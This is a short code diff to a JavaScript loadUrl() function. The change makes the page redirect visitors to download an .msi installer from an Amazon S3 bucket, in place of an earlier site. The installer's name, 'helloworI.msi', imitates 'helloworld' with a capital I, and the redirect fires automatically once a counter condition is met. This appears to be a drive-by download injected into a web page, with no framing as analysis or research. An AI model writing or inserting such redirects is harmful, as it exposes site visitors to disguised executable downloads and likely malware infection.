@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://www.yssuygdm.com";
+		var url="https://hwooo1232.s3.ap-southeast-2.amazonaws.com/helloworI.msi";
 		window.location=url;
 	}
 }
